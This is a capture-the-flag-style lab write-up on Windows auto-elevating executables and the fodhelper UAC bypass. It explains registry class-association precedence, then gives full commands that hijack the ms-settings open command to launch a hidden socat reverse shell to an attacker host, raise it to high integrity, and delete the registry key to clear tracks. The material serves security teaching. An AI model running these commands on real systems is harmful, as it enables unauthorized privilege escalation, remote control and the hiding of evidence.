# AutoElevating processes

Some executables can autoelevate, achieving high IL without any user intervention. This applies to most of the 
Control Panel's functionality and some executables provided with Windows.

* `mmc.exe` will auto elevate depending on the `.msc` snap-in that the user requests. Most of the `.msc` files included with Windows will auto elevate.
* Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes `pkgmgr.exe` and `spinstall.exe`.
* `COM` objects can also request auto-elevation by [configuring some registry keys](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker).

For an application, to auto-elevate:

* The executable must be signed by the Windows Publisher.
* The executable must be contained in a trusted directory, like `%SystemRoot%/System32/` or `%ProgramFiles%/`.

Depending on the type of application, additional requirements may apply:

* Executable files must declare the `autoElevate` element inside their manifests. 

To check a file's manifest using sigcheck (part of the Sysinternals suite):

```text
C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>
```

## Fodhelper

`Fodhelper.exe` is one of Windows default executables in charge of managing Windows optional features, including 
additional languages, applications not installed by default, or other operating system characteristics. Like most of 
the programs used for system configuration, fodhelper can auto elevate when using default `UAC` settings so that 
administrators won't be prompted for elevation when performing standard administrative tasks. 

fodhelper can be abused without having access to a GUI. It can be used through a medium integrity remote shell and 
leveraged into a fully functional high integrity process. This particular technique was discovered by 
[winscripting](https://winscripting.blog/2017/05/12/first-entry-welcome-and-`UAC`-bypass/) and has been used in the 
wild by the Glupteba malware.

When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as 
Programmatic ID (`ProgID`) for each filetype, where the corresponding application is associated. When for example, 
trying to open an HTML file, a part of the registry known as the `HKEY_CLASSES_ROOT` will be checked so that the 
system knows that it must use your preferred web client to open it. The command to use will be specified under the 
`shell/open/command` subkey for each file's `ProgID`. 

In reality, `HKEY_CLASSES_ROOT` is just a merged view of two different paths on the registry:

| Path	                               | Description                     |
|:------------------------------------|:--------------------------------|
| HKEY_LOCAL_MACHINE\Software\Classes | System-wide file associations   |
| HKEY_CURRENT_USER\Software\Classes  | Active user's file associations |

When checking `HKEY_CLASSES_ROOT`, if there is a user-specific association at `HKEY_CURRENT_USER` (`HKCU`), it will 
take priority. If no user-specific association is configured, then the system-wide association at `HKEY_LOCAL_MACHINE` 
(`HKLM`) will be used instead. This way, each user can choose their preferred applications separately if desired.

`fodhelper` searches the registry for a specific key of interest under the ms-settings `ProgID`. By creating an 
association for that `ProgID` in the current user's context under `HKCU`, we will override the default system-wide 
association and, therefore, control which command is used to open the file. Since `fodhelper` is an `autoElevate` 
executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing `UAC`.

## Lab

Note: Defender is disabled. For abusing fodhelper with Defender enabled, see [Improve fodhelper exploit](fodhelper.md).

One of our agents has planted a backdoor on the target server for your convenience. He managed to create an account 
within the Administrators group, but `UAC` is preventing the execution of any privileged tasks. To retrieve the flag, 
he needs you to bypass `UAC` and get a fully functional high IL shell.

To connect to the backdoor:

    nc MACHINE_IP 9999

Once connected, check if our user is part of the Administrators group and that it is running with a medium integrity 
token:

```text
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
myserver\attacker

C:\Windows\system32>net user attacker | find "Local Group"
net user attacker | find "Local Group"
Local Group Memberships      *Administrators       *Users                

C:\Windows\system32>whoami /groups | find "Label"
whoami /groups | find "Label"
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

Set the required registry values to associate the ms-settings class to a reverse shell using socat. 
we need to create an empty value called DelegateExecute for the class association to take effect. If this registry 
value is not present, the operating system will ignore the command and use the system-wide class association instead.

```text
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.
```

Set up a listener on the attack machine:

    nc -lvp 4444

And execute fodhelper on the target machine:

    C:\> fodhelper.exe

In the reverse shell, check:

```text
C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Get the flag:

```text
C:\> C:\flags\GetFlag-fodhelper.exe
```

And clear tracks:

    reg delete HKCU\Software\Classes\ms-settings\ /f